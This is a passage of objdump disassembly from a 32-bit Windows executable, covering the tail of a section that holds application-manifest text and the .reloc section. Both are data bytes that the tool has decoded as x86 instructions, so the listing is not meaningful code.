  43ac7f:	ins    BYTE PTR es:[edi],dx
  43ac80:	outs   dx,BYTE PTR ds:[esi]
  43ac81:	jae    0x43acc0
  43ac83:	and    dh,BYTE PTR [ebp+0x72]
  43ac86:	outs   dx,BYTE PTR ds:[esi]
  43ac87:	cmp    dh,BYTE PTR [ebx+0x63]
  43ac8a:	push   0x73616d65
  43ac8f:	sub    eax,0x7263696d
  43ac94:	outs   dx,DWORD PTR ds:[esi]
  43ac95:	jae    0x43ad06
  43ac97:	data16 je 0x43acc7
  43ac9a:	arpl   WORD PTR [edi+0x6d],bp
  43ac9d:	cmp    ah,BYTE PTR [ecx+0x73]
  43aca0:	ins    DWORD PTR es:[edi],dx
  43aca1:	cs jbe 0x43acd7
  43aca4:	and    bh,BYTE PTR [esi]
  43aca6:	cmp    al,0x73
  43aca8:	arpl   WORD PTR gs:[ebp+0x72],si
  43acac:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x7165723c
  43acb4:	jne    0x43ad1b
  43acb6:	jae    0x43ad2c
  43acb8:	gs fs push eax
  43acbb:	jb     0x43ad26
  43acbd:	jbe    0x43ad28
  43acbf:	ins    BYTE PTR es:[edi],dx
  43acc0:	gs addr16 gs jae 0x43ad03
  43acc5:	cmp    al,0x72
  43acc7:	gs jno 0x43ad3f
  43acca:	gs jae 0x43ad41
  43accd:	gs fs inc ebp
  43acd0:	js     0x43ad37
  43acd2:	arpl   WORD PTR [ebp+0x74],si
  43acd5:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  43acdc:	ins    BYTE PTR es:[edi],dx
  43acdd:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  43ace1:	gs ins BYTE PTR es:[edi],dx
  43ace3:	cmp    eax,0x49736122
  43ace8:	outs   dx,BYTE PTR ds:[esi]
  43ace9:	jbe    0x43ad5a
  43aceb:	imul   esp,DWORD PTR [ebp+0x72],0x22
  43acef:	and    BYTE PTR [ebp+0x69],dh
  43acf2:	inc    ecx
  43acf3:	arpl   WORD PTR [ebx+0x65],sp
  43acf6:	jae    0x43ad6b
  43acf8:	cmp    eax,0x6c616622
  43acfd:	jae    0x43ad64
  43acff:	and    bh,BYTE PTR [esi]
  43ad01:	cmp    al,0x2f
  43ad03:	jb     0x43ad6a
  43ad05:	jno    0x43ad7c
  43ad07:	gs jae 0x43ad7e
  43ad0a:	gs fs inc ebp
  43ad0d:	js     0x43ad74
  43ad0f:	arpl   WORD PTR [ebp+0x74],si
  43ad12:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  43ad19:	ins    BYTE PTR es:[edi],dx
  43ad1a:	ds cmp al,0x2f
  43ad1d:	jb     0x43ad84
  43ad1f:	jno    0x43ad96
  43ad21:	gs jae 0x43ad98
  43ad24:	gs fs push eax
  43ad27:	jb     0x43ad92
  43ad29:	jbe    0x43ad94
  43ad2b:	ins    BYTE PTR es:[edi],dx
  43ad2c:	gs addr16 gs jae 0x43ad6f
  43ad31:	cmp    al,0x2f
  43ad33:	jae    0x43ad9a
  43ad35:	arpl   WORD PTR [ebp+0x72],si
  43ad38:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x72742f3c
  43ad40:	jne    0x43adb5
  43ad42:	je     0x43ad8d
  43ad44:	outs   dx,BYTE PTR ds:[esi]
  43ad45:	outs   dx,WORD PTR ds:[esi]
  43ad47:	ds cmp al,0x2f
  43ad4a:	popa   
  43ad4b:	jae    0x43adc0
  43ad4d:	gs ins DWORD PTR es:[edi],dx
  43ad4f:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  43ad53:	push   eax

Disassembly of section .reloc:

0043b000 <.reloc>:
  43b000:	add    BYTE PTR [eax],dl
  43b002:	add    BYTE PTR [eax],al
  43b004:	mov    ah,0x0
  43b006:	add    BYTE PTR [eax],al
  43b008:	add    al,0x30
  43b00a:	adc    BYTE PTR [eax],dh
  43b00c:	adc    al,0x30
  43b00e:	sbb    BYTE PTR [eax],dh
  43b010:	sbb    al,0x30
  43b012:	jl     0x43b044
  43b014:	xor    BYTE PTR [eax],0xb4
  43b017:	xor    DWORD PTR [eax-0x3fce43cf],edi
  43b01d:	xor    esp,eax
  43b01f:	xor    eax,ecx
  43b021:	xor    esp,ecx
  43b023:	xor    eax,edx
  43b025:	xor    esp,edx
  43b027:	xor    eax,ebx
  43b029:	xor    esp,ebx
  43b02b:	xor    eax,esp
  43b02d:	xor    eax,ebp
  43b02f:	xor    esp,ebp
  43b031:	xor    esp,esi
  43b033:	xor    eax,edi
  43b035:	xor    DWORD PTR [eax],eax
  43b037:	xor    al,BYTE PTR [edx+esi*1]
  43b03a:	or     al,0x32
  43b03c:	adc    BYTE PTR [edx],dh
  43b03e:	sbb    BYTE PTR [edx],dh
  43b040:	sbb    al,0x32
  43b042:	and    al,0x32
  43b044:	sub    BYTE PTR [edx],dh
  43b046:	xor    BYTE PTR [edx],dh
  43b048:	xor    al,0x32
  43b04a:	cmp    al,0x32
  43b04c:	inc    eax
  43b04d:	xor    cl,BYTE PTR [eax+0x32]
  43b050:	dec    esp
  43b051:	xor    dl,BYTE PTR [edx+esi*1+0x58]
  43b055:	xor    bl,BYTE PTR [edx+esi*1+0x60]
  43b059:	xor    ah,BYTE PTR [edx+esi*1+0x68]
  43b05d:	xor    ch,BYTE PTR [edx+esi*1+0x70]
  43b061:	xor    dh,BYTE PTR [edx+esi*1+0x78]
  43b065:	xor    bh,BYTE PTR [edx+esi*1-0x7c]
  43b069:	xor    cl,BYTE PTR [eax-0x6fcd73ce]
  43b06f:	xor    dl,BYTE PTR [edx+esi*1+0x329c3298]
  43b076:	mov    al,ds:0xa832a432
  43b07b:	xor    ch,BYTE PTR [edx+esi*1+0x349032b0]
  43b082:	xchg   esp,eax
  43b083:	xor    al,0x98
  43b085:	xor    al,0x9c
  43b087:	xor    al,0xa0
  43b089:	xor    al,0xa4
  43b08b:	xor    al,0x0
  43b08d:	xor    eax,0x35083504
  43b092:	or     al,0x35
  43b094:	adc    BYTE PTR ds:0x35183514,dh
  43b09a:	sbb    al,0x35
  43b09c:	and    BYTE PTR ds:0x35283524,dh
  43b0a2:	sub    al,0x35
  43b0a4:	xor    BYTE PTR ds:0x35383534,dh
  43b0aa:	cmp    al,0x35
  43b0ac:	inc    eax
  43b0ad:	xor    eax,0x35483544
  43b0b2:	dec    esp
  43b0b3:	xor    eax,0x2000
  43b0b8:	and    al,0x1
  43b0ba:	add    BYTE PTR [eax],al
  43b0bc:	hlt    
  43b0bd:	ss clc 
  43b0bf:	ss push 0x81376e37
  43b0c5:	aaa    
  43b0c6:	xchg   edx,eax
  43b0c7:	aaa    
  43b0c8:	call   0xb237:0xac37a637
  43b0cf:	aaa    
  43b0d0:	lds    esi,FWORD PTR [edi]
  43b0d2:	shl    DWORD PTR [edi],cl
  43b0d4:	in     eax,0x37
  43b0d6:	div    DWORD PTR [edi]
  43b0d8:	add    al,0x38
  43b0da:	or     eax,0x27381c38
  43b0df:	cmp    BYTE PTR [esi+0x38],al
  43b0e2:	push   ecx
  43b0e3:	cmp    BYTE PTR [edx+0x38],bl
  43b0e6:	push   0x7e387438
  43b0eb:	cmp    BYTE PTR [ebx-0x65c76ac8],cl
  43b0f1:	cmp    BYTE PTR [ecx-0x40c747c8],ah
  43b0f7:	cmp    dl,cl
  43b0f9:	cmp    bl,dl
  43b0fb:	cmp    al,bl
  43b0fd:	cmp    ch,bl
  43b0ff:	cmp    ah,ah
  43b101:	cmp    cl,ch
  43b103:	cmp    bh,dh
  43b105:	cmp    BYTE PTR [ebx],al
  43b107:	cmp    DWORD PTR ds:0x24391a39,ecx
  43b10d:	cmp    DWORD PTR [edx],ebp
  43b10f:	cmp    DWORD PTR [esi],esi
  43b111:	cmp    DWORD PTR [edi],edi
  43b113:	cmp    DWORD PTR [edx+0x39],ecx
  43b116:	push   ebp
  43b117:	cmp    DWORD PTR [esi+0x39],ebp
  43b11a:	jbe    0x43b155
  43b11c:	test   BYTE PTR [ecx],bh
  43b11e:	lea    edi,[ecx]
  43b120:	xchg   ebp,eax
  43b121:	cmp    DWORD PTR [ebp-0x50c656c7],ebx
  43b127:	cmp    DWORD PTR [esi-0x14c634c7],edi
  43b12d:	cmp    edx,esi
  43b12f:	cmp    DWORD PTR [ebx],edx
  43b131:	cmp    bl,BYTE PTR [edx+edi*1]
  43b134:	and    edi,DWORD PTR [edx]
  43b136:	sub    BYTE PTR [edx],bh
  43b138:	xor    BYTE PTR [edx],bh
  43b13a:	cmp    BYTE PTR [edx],bh
  43b13c:	cmp    al,BYTE PTR ds:[edx+edi*1+0x4b]
  43b141:	cmp    bl,BYTE PTR [edx+edi*1+0x63]
  43b145:	cmp    dh,BYTE PTR [edi+0x3a]
  43b148:	mov    edi,DWORD PTR [edx]
  43b14a:	call   0xee3a:0xe43aae3a
  43b151:	cmp    bl,BYTE PTR [edi]
  43b153:	cmp    esp,DWORD PTR [esi+0x3b]
  43b156:	xchg   edi,eax
  43b157:	cmp    edx,ebp
  43b159:	cmp    ebx,ebp
  43b15b:	cmp    ebp,eax
  43b15d:	cmp    esi,eax
  43b15f:	cmp    ecx,DWORD PTR [ebp+0x633d533c]
  43b165:	cmp    eax,0x3d7f3d6e
  43b16a:	stos   BYTE PTR es:[edi],al
  43b16b:	cmp    eax,0x3dc23db1
  43b170:	leave  
  43b171:	cmp    eax,0x3dd93dd2
  43b176:	call   0x281a1b8
  43b17b:	or     DWORD PTR ds:[esi],edi
  43b17e:	sbb    DWORD PTR [esi],edi
  43b180:	push   ds
  43b181:	ds es sub edi,DWORD PTR ds:[esi]
  43b186:	ss ds inc ecx
  43b189:	ds dec ebp
  43b18b:	ds pop ecx
  43b18d:	ds ds ins DWORD PTR es:[di],dx
  43b191:	ds je  0x43b1d2
  43b194:	jg     0x43b1d4
  43b196:	mov    edi,DWORD PTR [esi]
  43b198:	mov    al,ds:0xc73ea53e
  43b19d:	ds int3 
  43b19f:	sar    BYTE PTR ds:[esi],cl
  43b1a2:	fstp   TBYTE PTR [esi]
  43b1a4:	loopne 0x43b1e4
  43b1a6:	jmp    0xa829fe9
  43b1ab:	aas    
  43b1ac:	and    edi,DWORD PTR [edi]
  43b1ae:	sub    al,0x3f
  43b1b0:	ss aas 
  43b1b2:	aas    
  43b1b3:	aas    
  43b1b4:	inc    edi
  43b1b5:	aas    
  43b1b6:	pop    ecx
  43b1b7:	aas    
  43b1b8:	fs aas 
  43b1ba:	jo     0x43b1fb
  43b1bc:	jl     0x43b1fd
  43b1be:	mov    BYTE PTR [edi],bh
  43b1c0:	xchg   esp,eax
  43b1c1:	aas    
  43b1c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b1c3:	aas    
  43b1c4:	stos   DWORD PTR es:[edi],eax
  43b1c5:	aas    
  43b1c6:	mov    cl,0x3f
  43b1c8:	mov    bh,0x3f
  43b1ca:	mov    ebp,0xd13fcb3f
  43b1cf:	aas    
  43b1d0:	xlat   BYTE PTR ds:[ebx]
  43b1d1:	aas    
  43b1d2:	in     eax,0x3f
  43b1d4:	jmp    0x43b215
  43b1d6:	lock aas 
  43b1d8:	add    BYTE PTR [eax],dh
  43b1da:	add    BYTE PTR [eax],al
  43b1dc:	fadd   DWORD PTR [eax]
  43b1de:	add    BYTE PTR [eax],al
  43b1e0:	or     al,0x30
  43b1e2:	sbb    dh,BYTE PTR [eax]
  43b1e4:	and    al,0x30
  43b1e6:	xor    DWORD PTR [eax],esi
  43b1e8:	cmp    esi,DWORD PTR [eax]
  43b1ea:	inc    ecx
  43b1eb:	xor    BYTE PTR [ecx+0x30],cl
  43b1ee:	push   edx
  43b1ef:	xor    BYTE PTR [eax+esi*1+0x30983092],al
  43b1f6:	lahf   
  43b1f7:	xor    BYTE PTR [edi-0x3ccf48d0],ch
  43b1fd:	xor    cl,cl
  43b1ff:	xor    BYTE PTR [ecx],ch
  43b201:	xor    DWORD PTR [edx+0x31],ecx
  43b204:	arpl   WORD PTR [ecx],si
  43b206:	fidiv  DWORD PTR [ecx]
  43b208:	and    BYTE PTR [edx],dh
  43b20a:	xor    DWORD PTR [edx],esi
  43b20c:	inc    ecx
  43b20d:	xor    bl,BYTE PTR [ebp+0x32]
  43b210:	lea    esi,[edx]
  43b212:	xchg   ebp,eax
  43b213:	xor    ah,BYTE PTR [ebp+0x332cd32]
  43b219:	xor    ecx,DWORD PTR [ecx]
  43b21b:	xor    ebx,DWORD PTR [edi]
  43b21d:	xor    esp,DWORD PTR [ebx+0x33]
  43b220:	jl     0x43b255
  43b222:	nop
  43b223:	xor    edi,DWORD PTR [eax-0x1acc37cd]
  43b229:	xor    edi,ecx
  43b22b:	xor    edx,DWORD PTR [ebx]
  43b22d:	xor    al,0x2e
  43b22f:	xor    al,0x49
  43b231:	xor    al,0x71
  43b233:	xor    al,0x76
  43b235:	xor    al,0x87
  43b237:	xor    al,0x8f
  43b239:	xor    al,0x9d
  43b23b:	xor    al,0xa5
  43b23d:	xor    al,0xb2
  43b23f:	xor    al,0xb9
  43b241:	xor    al,0xf1
  43b243:	xor    al,0xfa
  43b245:	xor    al,0xf
  43b247:	xor    eax,0x352a351b
  43b24c:	call   0xd335:0xbd35a535
  43b253:	xor    eax,0x35ec35dc
  43b258:	pop    es
  43b259:	ss das 
  43b25b:	ss inc eax
  43b25d:	ss dec ebx
  43b25f:	ss push 0x36
  43b262:	test   BYTE PTR [esi],dh
  43b264:	xchg   ebp,eax
  43b265:	lods   al,BYTE PTR ss:[esi]
  43b267:	ss mov dh,0x36
  43b26a:	mov    ebx,0xc836c336
  43b26f:	ss dec eax
  43b271:	aaa    
  43b272:	mov    BYTE PTR [edi],dh
  43b274:	mov    al,ds:0x68384937
  43b279:	cmp    BYTE PTR [ecx+0x38],dh
  43b27c:	sub    edi,DWORD PTR [ecx]
  43b27e:	xor    DWORD PTR [ecx],edi
  43b280:	sub    al,0x3a
  43b282:	dec    esp
  43b283:	cmp    cl,BYTE PTR [esi]
  43b285:	cmp    eax,edi
  43b287:	cmp    edx,ecx
  43b289:	cmp    ecx,DWORD PTR [ecx]
  43b28b:	cmp    al,0x10
  43b28d:	cmp    al,0x17
  43b28f:	cmp    al,0x23
  43b291:	cmp    al,0x29
  43b293:	cmp    al,0x2f
  43b295:	cmp    al,0x35
  43b297:	cmp    al,0x77
  43b299:	cmp    al,0xcc
  43b29b:	cmp    al,0xd2
  43b29d:	cmp    al,0x6b
  43b29f:	cmp    eax,0x3dd23db2
  43b2a4:	adc    DWORD PTR [esi],edi
  43b2a6:	sar    BYTE PTR [esi],0xcc
  43b2a9:	ds jl  0x43b2eb
  43b2ac:	fidivr WORD PTR [edi]
  43b2ae:	jmp    0xd000:0x40003f
  43b2b5:	add    BYTE PTR [eax],al
  43b2b7:	add    BYTE PTR [eax],al
  43b2b9:	xor    BYTE PTR [ebx],cl
  43b2bb:	xor    BYTE PTR [eax],dl
  43b2bd:	xor    BYTE PTR [esi],dl
  43b2bf:	xor    BYTE PTR [eax+esi*1-0x7f],al
  43b2c3:	xor    BYTE PTR [ebp+0x3530ee30],cl
  43b2c9:	xor    DWORD PTR [edi+0x31],esp
  43b2cc:	mov    al,ds:0xc931ac31
  43b2d1:	xor    DWORD PTR [ebx],ecx
  43b2d3:	xor    bl,BYTE PTR [edx+esi*1]
  43b2d6:	xor    dh,BYTE PTR [edx]
  43b2d8:	cmp    esi,DWORD PTR [edx]
  43b2da:	pop    esp
  43b2db:	xor    dh,BYTE PTR [edi+0x32]
  43b2de:	xor    BYTE PTR [edx],0xa6
  43b2e1:	xor    bh,BYTE PTR [esi]
  43b2e3:	xor    ecx,ecx
  43b2e5:	xor    esi,DWORD PTR [edi+0x34]
  43b2e8:	test   BYTE PTR [ecx+edi*4],dh
  43b2eb:	xor    al,0xec
  43b2ed:	xor    al,0xfb
  43b2ef:	xor    al,0x32
  43b2f1:	xor    eax,0x3550353d
  43b2f6:	pop    eax
  43b2f7:	xor    eax,0x357d3562
  43b2fc:	mov    cl,0x35
  43b2fe:	and    dh,BYTE PTR [esi]
  43b300:	xor    DWORD PTR [esi],esi
  43b302:	cmp    BYTE PTR [esi],dh
  43b304:	mov    eax,ds:0xe636ae36
  43b309:	aaa    
  43b30a:	icebp  
  43b30b:	aaa    
  43b30c:	add    bh,BYTE PTR [eax]
  43b30e:	inc    ecx
  43b30f:	cmp    ah,ah
  43b311:	cmp    BYTE PTR [ecx+0x39],bl
  43b314:	stos   DWORD PTR es:[edi],eax
  43b315:	cmp    DWORD PTR [esi-0x28c63dc7],esi
  43b31b:	cmp    ebx,esp
  43b31d:	cmp    edx,ebp
  43b31f:	cmp    ebx,esi
  43b321:	cmp    DWORD PTR [ecx],ebx
  43b323:	cmp    dl,BYTE PTR [edi+0x3a]
  43b326:	(bad)  
  43b327:	cmp    bl,BYTE PTR [esi-0x21c557c6]
  43b32d:	cmp    ch,al
  43b32f:	cmp    ch,dh
  43b331:	cmp    bh,dh
  43b333:	cmp    bl,BYTE PTR [eax]
  43b335:	cmp    esp,DWORD PTR [esi]
  43b337:	cmp    esi,DWORD PTR [ebx+edi*1]
  43b33a:	cmp    eax,0x7e3b443b
  43b33f:	cmp    edx,DWORD PTR [edx+0xe3b9f3b]
  43b345:	cmp    al,0x3b
  43b347:	cmp    al,0x42
  43b349:	cmp    al,0x61
  43b34b:	cmp    al,0xa7
  43b34d:	cmp    al,0x2b
  43b34f:	ds dec ecx
  43b351:	ds push ebp
  43b353:	ds pop ebp
  43b355:	ds jnp 0x43b396
  43b358:	test   BYTE PTR [esi],bh
  43b35a:	xchg   esi,eax
  43b35b:	ds mov edi,0xd63ec93e
  43b361:	ds in  eax,0x3e
  43b364:	out    dx,eax
  43b365:	ds or  al,0x3f
  43b368:	pop    ss
  43b369:	aas    
  43b36a:	pop    ds
  43b36b:	aas    
  43b36c:	dec    ebx
  43b36d:	aas    
  43b36e:	push   esp
  43b36f:	aas    
  43b370:	pop    ebx
  43b371:	aas    
  43b372:	pusha  
  43b373:	aas    
  43b374:	ins    BYTE PTR es:[edi],dx
  43b375:	aas    
  43b376:	cmp    DWORD PTR [edi],0xffffff89
  43b379:	aas    
  43b37a:	mov    ebx,0x3fe93f
  43b37f:	add    BYTE PTR [eax],al
  43b381:	push   eax
  43b382:	add    BYTE PTR [eax],al
  43b384:	in     al,dx
  43b385:	add    BYTE PTR [eax],al
  43b387:	add    BYTE PTR [eax],al
  43b389:	xor    BYTE PTR [edx],dl
  43b38b:	xor    BYTE PTR [esi],ah
  43b38d:	xor    BYTE PTR [edi+0x30],dl
  43b390:	pop    esp
  43b391:	xor    BYTE PTR [ebx+0x30],ch
  43b394:	mov    al,0x30
  43b396:	fnsave [eax]
  43b398:	out    dx,eax
  43b399:	xor    BYTE PTR [ecx],cl
  43b39b:	xor    DWORD PTR [edi-0x60ce68cf],ecx
  43b3a1:	xor    edi,ebp
  43b3a3:	xor    esi,esi
  43b3a5:	xor    DWORD PTR [ebx+0x32],ecx
  43b3a8:	push   edx
  43b3a9:	xor    ah,BYTE PTR [eax+0x32]
  43b3ac:	xor    cl,BYTE PTR [bp+si-0x6ece]
  43b3b1:	xor    bh,BYTE PTR [ebx+0x5a32c232]
  43b3b7:	xor    esp,DWORD PTR [ebx+esi*1+0x77]
  43b3bb:	xor    eax,DWORD PTR [ebx-0x65cbf6cd]
  43b3c1:	xor    al,0x7
  43b3c3:	xor    eax,0x3540352b
  43b3c8:	dec    eax
  43b3c9:	xor    eax,0x3562354e
  43b3ce:	jl     0x43b405
  43b3d0:	xchg   esp,eax
  43b3d1:	xor    eax,0x35d935a1
  43b3d6:	in     eax,dx
  43b3d7:	xor    eax,0x36223602
  43b3dc:	jl     0x43b414
  43b3de:	or     esi,DWORD PTR [edi]
  43b3e0:	push   edx
  43b3e1:	aaa    
  43b3e2:	pop    edx
  43b3e3:	aaa    
  43b3e4:	xor    BYTE PTR [edi],0x8c
  43b3e7:	aaa    
  43b3e8:	xchg   esp,eax
  43b3e9:	aaa    
  43b3ea:	lahf   
  43b3eb:	aaa    
  43b3ec:	stos   DWORD PTR es:[edi],eax
  43b3ed:	aaa    
  43b3ee:	shl    DWORD PTR [edi],cl
  43b3f0:	loopne 0x43b429
  43b3f2:	push   DWORD PTR [edi]
  43b3f4:	push   cs
  43b3f5:	cmp    BYTE PTR [eax+edi*1],ch
  43b3f8:	xor    al,0x38
  43b3fa:	pop    ecx
  43b3fb:	cmp    BYTE PTR [eax+edi*1+0x21],ah
  43b3ff:	cmp    DWORD PTR [ecx+edi*1+0x72],esp
  43b403:	cmp    ecx,ebx
  43b405:	cmp    DWORD PTR ds:0x5e3a583a,edi
  43b40b:	cmp    cl,BYTE PTR [edx-0x39c556c6]
  43b411:	cmp    bl,dh
  43b413:	cmp    cl,BYTE PTR [esi]
  43b415:	cmp    ebp,DWORD PTR [edx]
  43b417:	cmp    eax,DWORD PTR [ebx+edi*1-0x4b]
  43b41b:	cmp    edx,ebp
  43b41d:	cmp    esp,ebx
  43b41f:	cmp    esi,edi
  43b421:	cmp    edi,esi
  43b423:	cmp    edx,DWORD PTR [esp+edi*1]
  43b426:	inc    eax
  43b427:	cmp    al,0x5a
  43b429:	cmp    al,0x6c
  43b42b:	cmp    al,0x73
  43b42d:	cmp    al,0x86
  43b42f:	cmp    al,0x8d
  43b431:	cmp    al,0xc4
  43b433:	cmp    al,0xea
  43b435:	cmp    al,0xf7
  43b437:	cmp    al,0x18
  43b439:	cmp    eax,0x3d703d25
  43b43e:	jp     0x43b47d
  43b440:	xchg   ebx,eax
  43b441:	cmp    eax,0x3de03dca
  43b446:	jmp    0x43b485
  43b448:	adc    edi,DWORD PTR [esi]
  43b44a:	sbb    edi,DWORD PTR [esi]
  43b44c:	push   esp
  43b44d:	ds push 0x3e
  43b450:	repz ds std 
  43b453:	ds add eax,0x423f3b3f
  43b459:	aas    
  43b45a:	dec    edx
  43b45b:	aas    
  43b45c:	push   0x9a3f713f
  43b461:	aas    
  43b462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b463:	aas    
  43b464:	stos   DWORD PTR es:[edi],eax
  43b465:	aas    
  43b466:	mov    cl,0x3f
  43b468:	ret    
  43b469:	aas    
  43b46a:	retf   0x3f
  43b46d:	pusha  
  43b46e:	add    BYTE PTR [eax],al
  43b470:	call   0xa43b475
  43b475:	xor    BYTE PTR [esi],dl
  43b477:	xor    al,bh
  43b479:	xor    BYTE PTR [ecx-0x15ce60cf],bl
  43b47f:	xor    DWORD PTR [ebx],ebx
  43b481:	xor    bh,BYTE PTR [ebx]
  43b483:	xor    ah,BYTE PTR [edx+0x32]
  43b486:	jno    0x43b4ba
  43b488:	xchg   esp,eax
  43b489:	xor    bh,BYTE PTR [ebp-0x33cd39ce]
  43b48f:	xor    dl,cl
  43b491:	xor    bl,al
  43b493:	xor    bl,ch
  43b495:	xor    ah,dh
  43b497:	xor    ch,bl
  43b499:	xor    dh,BYTE PTR [ebx+esi*1]
  43b49c:	inc    ecx
  43b49d:	xor    esp,DWORD PTR [ebp+0x33]
  43b4a0:	je     0x43b4d5
  43b4a2:	sti    
  43b4a3:	xor    ecx,DWORD PTR [ecx]
  43b4a5:	xor    al,0x5e
  43b4a7:	xor    al,0x92
  43b4a9:	xor    al,0xa6
  43b4ab:	xor    al,0x23
  43b4ad:	xor    eax,0x3580355a
  43b4b2:	mov    BYTE PTR ds:0x35bc359a,dh
  43b4b8:	(bad)  
  43b4b9:	xor    eax,0x363d35ee
  43b4be:	pop    eax
  43b4bf:	ss pusha 
  43b4c1:	ss ss xchg bp,ax
  43b4c5:	ss mov eax,0xf736f136
  43b4cb:	or     dh,BYTE PTR ss:[edi]
  43b4ce:	and    DWORD PTR [edi],esi
  43b4d0:	mov    dh,BYTE PTR [edi]
  43b4d2:	fwait
  43b4d3:	aaa    
  43b4d4:	stos   DWORD PTR es:[edi],eax
  43b4d5:	aaa    
  43b4d6:	mov    dh,0x37
  43b4d8:	mov    ebx,0xcf37c937
  43b4dd:	aaa    
  43b4de:	(bad)  [edi]
  43b4e0:	or     al,0x38
  43b4e2:	adc    edi,DWORD PTR [eax]
  43b4e4:	sbb    DWORD PTR [eax],edi
  43b4e6:	sub    DWORD PTR [eax],edi
  43b4e8:	das    
  43b4e9:	cmp    BYTE PTR [edi],dh
  43b4eb:	cmp    BYTE PTR [esi],bh
  43b4ed:	cmp    BYTE PTR [eax+edi*1+0x4c],al
  43b4f1:	cmp    BYTE PTR [ecx-0x4c75ac8],bl
  43b4f7:	cmp    BYTE PTR [eax],ah
  43b4f9:	cmp    DWORD PTR [ecx+edi*1],esi
  43b4fc:	adc    DWORD PTR [edx],edi
  43b4fe:	popa   
  43b4ff:	cmp    ch,BYTE PTR [ecx+0x3a]
  43b502:	jo     0x43b53e
  43b504:	jle    0x43b540
  43b506:	lods   al,BYTE PTR ds:[esi]
  43b507:	cmp    dh,BYTE PTR [esi+0x2b3ac43a]
  43b50d:	cmp    esi,DWORD PTR [ecx]
  43b50f:	cmp    eax,DWORD PTR [esi-0x1fc445c5]
  43b515:	cmp    ebp,esi
  43b517:	cmp    edi,edx
  43b519:	cmp    ecx,DWORD PTR [ebx]
  43b51b:	cmp    al,0x20
  43b51d:	cmp    al,0x3f
  43b51f:	cmp    al,0xa7
  43b521:	cmp    al,0xb0
  43b523:	cmp    al,0xc5
  43b525:	cmp    al,0xfc
  43b527:	cmp    al,0x3
  43b529:	cmp    eax,0x3d153d0c
  43b52e:	and    al,0x3d
  43b530:	inc    edx
  43b531:	cmp    eax,0x3d733d5a
  43b536:	test   DWORD PTR ds:0x3e3a3e1f,edi
  43b53c:	bound  edi,QWORD PTR [esi]
  43b53e:	outs   dx,DWORD PTR ds:[esi]
  43b53f:	cmp    DWORD PTR ds:[esi],0xffffffa3
  43b543:	ds mov ah,0x3e
  43b546:	mov    ecx,0x1e3ebf3e
  43b54b:	aas    
  43b54c:	dec    ebx
  43b54d:	aas    
  43b54e:	test   DWORD PTR [edi],edi
  43b550:	sar    DWORD PTR [edi],0xd6
  43b553:	aas    
  43b554:	add    BYTE PTR [eax+0x0],dh
  43b557:	add    BYTE PTR [ecx+eax*1],dh
  43b55a:	add    BYTE PTR [eax],al
  43b55c:	or     eax,0x1f301830
  43b561:	xor    BYTE PTR [ebx],ch
  43b563:	xor    BYTE PTR [ecx+0x30],al
  43b566:	xchg   esp,eax
  43b567:	xor    BYTE PTR [esi-0x26cf49d0],ch
  43b56d:	xor    bh,bl
  43b56f:	xor    dh,ah
  43b571:	xor    ah,ch
  43b573:	xor    bh,dh
  43b575:	xor    BYTE PTR [ecx+esi*1],al
  43b578:	push   ss
  43b579:	xor    DWORD PTR [ecx+esi*1],esi
  43b57c:	cmp    al,0x31
  43b57e:	fnsave [ecx]
  43b580:	pop    ss
  43b581:	xor    ch,BYTE PTR [edi]
  43b583:	xor    al,BYTE PTR [ebx+0x32]
  43b586:	dec    edx
  43b587:	xor    dh,BYTE PTR [edi+0x32]
  43b58a:	mov    esi,DWORD PTR [edx]
  43b58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b58d:	xor    al,BYTE PTR [esi]
  43b58f:	xor    ecx,DWORD PTR [edx+0x33]
  43b592:	push   0x9b338c33
  43b597:	xor    ebp,DWORD PTR [edi-0xcc3ccd]
  43b59d:	xor    ecx,DWORD PTR [edx]
  43b59f:	xor    al,0x47
  43b5a1:	xor    al,0xa9
  43b5a3:	xor    al,0xb3
  43b5a5:	xor    al,0xc1
  43b5a7:	xor    al,0xd3
  43b5a9:	xor    al,0xde
  43b5ab:	xor    al,0x40
  43b5ad:	xor    eax,0x356e3553
  43b5b2:	lds    esi,FWORD PTR ds:0x36b43656
  43b5b8:	ret    
  43b5b9:	ss loopne 0x43b5f2
  43b5bc:	jmp    0x43b5f4
  43b5be:	repz or dh,BYTE PTR ss:[edi]
  43b5c2:	adc    BYTE PTR [edi],dh
  43b5c4:	pop    ss
  43b5c5:	aaa    
  43b5c6:	and    al,0x37
  43b5c8:	cmp    dh,BYTE PTR [edi]
  43b5ca:	dec    esi
  43b5cb:	aaa    
  43b5cc:	push   ebp
  43b5cd:	aaa    
  43b5ce:	pop    ebx
  43b5cf:	aaa    
  43b5d0:	popa   
  43b5d1:	aaa    
  43b5d2:	push   0x37
  43b5d4:	mov    esi,DWORD PTR [edi]
  43b5d6:	call   0xfc37:0xf537dc37
  43b5dd:	aaa    
  43b5de:	or     BYTE PTR [eax],bh
  43b5e0:	xor    DWORD PTR [eax],edi
  43b5e2:	cmp    BYTE PTR [eax],bh
  43b5e4:	inc    edi
  43b5e5:	cmp    BYTE PTR [edi+0x38],cl
  43b5e8:	bound  edi,QWORD PTR [eax]
  43b5ea:	lea    edi,[eax]
  43b5ec:	xchg   edi,eax
  43b5ed:	cmp    BYTE PTR [esi-0x1ac732c8],bl
  43b5f3:	cmp    BYTE PTR [ebx],dl
  43b5f5:	cmp    DWORD PTR [ebx],esp
  43b5f7:	cmp    DWORD PTR [ebx],ebp
  43b5f9:	cmp    DWORD PTR [edi],esi
  43b5fb:	cmp    DWORD PTR [edx+0x39],esp
  43b5fe:	push   0xa2399139
  43b603:	cmp    DWORD PTR [edx-0x23c62ac7],edi
  43b609:	cmp    esp,esp
  43b60b:	cmp    DWORD PTR [ebx+0x3a],ebx
  43b60e:	bound  edi,QWORD PTR [edx]
  43b610:	jge    0x43b64c
  43b612:	xchg   BYTE PTR [edx],bh
  43b614:	mov    eax,ds:0xc23aaa3a
  43b619:	cmp    cl,bl
  43b61b:	cmp    ah,bl
  43b61d:	cmp    ch,ah
  43b61f:	cmp    dl,BYTE PTR [edi]
  43b621:	cmp    esp,DWORD PTR [edx]
  43b623:	cmp    ecx,DWORD PTR [ebx+0x3b]
